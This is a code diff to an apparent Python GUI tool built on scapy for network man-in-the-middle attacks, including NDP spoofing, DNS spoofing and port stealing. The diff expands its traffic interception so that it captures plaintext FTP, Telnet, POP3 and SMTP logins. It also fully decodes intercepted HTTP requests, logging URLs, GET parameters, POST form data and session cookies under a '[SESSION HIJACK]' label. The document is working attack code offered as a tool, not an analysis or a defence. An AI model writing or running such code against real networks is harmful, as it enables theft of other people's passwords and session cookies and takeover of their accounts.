@@ -16,9 +16,6 @@ from PySide6.QtGui import QIcon
 from PySide6.QtCore import Qt, QThread, Signal
 import socket
 import time
-import struct
-import binascii
-import random
 
 user_fields = [
     "phone", "user_pass", "uname", "user_login", "user_name", "email",
@@ -131,7 +128,6 @@ def ndp_spoof(target_ipv6, router_ipv6, iface, stop_event, log_cb):
         log_cb(f"NDP spoofing error: {e}")
 
 def get_mac_v6(ipv6, iface):
-    # Use Neighbor Solicitation to get MAC for IPv6 address
     ns = scapy.Ether(dst="33:33:ff:" + ":".join(ipv6.split(":")[-3:])) / \
         scapy.IPv6(dst=ipv6) / scapy.ICMPv6ND_NS(tgt=ipv6)
     ans = scapy.srp(ns, iface=iface, timeout=2, verbose=False)[0]
@@ -207,7 +203,6 @@ class DNSPacketInterceptor:
             if scapy_packet.haslayer(scapy.DNSQR):
                 qname = scapy_packet[scapy.DNSQR].qname.decode()
                 self.log_cb(f"DNS Query: {qname}")
-                # DNS Sniffing
                 spoofed = False
                 for domain in self.domains_to_spoof:
                     if domain in qname:
@@ -260,20 +255,49 @@ class PacketCaptureThread(QThread):
                     if scapy_packet.haslayer(scapy.Raw):
                         payload = scapy_packet[scapy.Raw].load.decode('latin-1', errors='ignore')
                         self.log.emit(f"[{proto}] {scapy_packet[scapy.IP].src}:{sport}->{dport}: {payload.strip()}")
-                        # Session hijack for FTP/TELNET/POP3/SMTP (look for USER/PASS)
                         if proto in ["FTP", "TELNET", "POP3", "SMTP"]:
                             if "USER" in payload or "PASS" in payload:
                                 self.log.emit(f"[HIJACK] Possible credentials: {payload.strip()}")
-                # HTTP session hijack (Cookie theft)
+                # HTTP session hijack (Cookie theft) and full HTTP decode
                 if dport == 80 or sport == 80:
                     if scapy_packet.haslayer(scapy.Raw):
                         payload = scapy_packet[scapy.Raw].load.decode('latin-1', errors='ignore')
-                        cookie = re.search(r"Cookie: (.*)", payload)
-                        if cookie and (scapy_packet[scapy.IP].src, scapy_packet[scapy.IP].dst) not in self.session_hijacked:
-                            self.session_hijacked.add((scapy_packet[scapy.IP].src, scapy_packet[scapy.IP].dst))
-                            self.log.emit(f"[SESSION HIJACK] Cookie: {cookie.group(1)}")
-                        if "POST" in payload:
-                            self.log.emit(f"[HTTP POST] {payload.strip()}")
+                        lines = payload.split("\r\n")
+                        if lines:
+                            request_line = lines[0]
+                            if request_line.startswith(("GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS", "PATCH")):
+                                self.log.emit(f"[HTTP] Request: {request_line}")
+                                method, path, *_ = request_line.split()
+                                host = None
+                                headers = {}
+                                i = 1
+                                while i < len(lines) and lines[i]:
+                                    if ": " in lines[i]:
+                                        key, value = lines[i].split(": ", 1)
+                                        headers[key] = value
+                                        if key.lower() == "host":
+                                            host = value
+                                    i += 1
+                                for k, v in headers.items():
+                                    self.log.emit(f"[HTTP] Header: {k}: {v}")
+                                if host:
+                                    url = f"http://{host}{path}"
+                                    self.log.emit(f"[HTTP] Full URL: {url}")
+                                if method == "GET" and "?" in path:
+                                    params = path.split("?", 1)[1]
+                                    parsed = parse_qs(params)
+                                    self.log.emit(f"[HTTP] GET Params: {parsed}")
+                                if "Cookie" in headers:
+                                    self.log.emit(f"[HTTP] Cookies: {headers['Cookie']}")
+                                    if (scapy_packet[scapy.IP].src, scapy_packet[scapy.IP].dst) not in self.session_hijacked:
+                                        self.session_hijacked.add((scapy_packet[scapy.IP].src, scapy_packet[scapy.IP].dst))
+                                        self.log.emit(f"[SESSION HIJACK] Cookie: {headers['Cookie']}")
+                                if method == "POST":
+                                    if "" in lines:
+                                        idx = lines.index("")
+                                        post_body = "\r\n".join(lines[idx+1:])
+                                        parsed_post = parse_qs(post_body)
+                                        self.log.emit(f"[HTTP] POST Data: {parsed_post}")
             packet.accept()
         except Exception as ex:
             self.log.emit(f"Packet processing error: {ex}")
@@ -336,8 +360,6 @@ class PortStealerThread(QThread):
                 try:
                     conn, addr = self._server_socket.accept()
                     self.log.emit(f"Connection from {addr}")
-                    # Try to hijack the TCP handshake (primitive way)
-                    # Ettercap-style would require raw socket injection, more advanced
                     conn.close()
                 except socket.timeout:
                     continue
@@ -421,7 +443,6 @@ class MainWindow(QWidget):
         sel_layout.addWidget(self.targets_lbl)
         layout.addLayout(sel_layout)
 
-        # DNS spoofing form
         self.dns_spoof_form = QFormLayout()
         self.dns_domain_line = QLineEdit()
         self.dns_ip_line = QLineEdit()
